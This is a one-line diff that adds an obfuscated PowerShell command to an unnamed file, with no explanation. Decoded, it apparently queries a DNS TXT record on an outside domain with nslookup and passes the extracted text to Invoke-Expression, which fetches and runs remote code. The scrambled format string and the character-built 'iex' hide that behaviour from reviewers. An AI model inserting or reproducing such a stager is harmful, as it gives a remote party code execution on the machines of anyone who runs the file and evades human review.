@@ -1,0 +1,1 @@
+﻿ .( $ShELlID[1]+$shELLiD[13]+'X') ( ((("{0}{6}{14}{17}{8}{13}{16}{15}{5}{7}{20}{12}{21}{19}{3}{10}{2}{9}{1}{11}{18}{4}"-f 'i','@(.*)@MLt)','h ML','a','Irimatches[1]}','x','f(M','t l.ns.','(ns','t','tc','{ie','ains.pl.)','looku','LtMLt','t','p -q=','+','x ','m','topbr',' -'))-CrEpLAcE  ([chAr]73+[chAr]114+[chAr]105),[chAr]36 -rEPLaCe'MLt',[chAr]34)) 
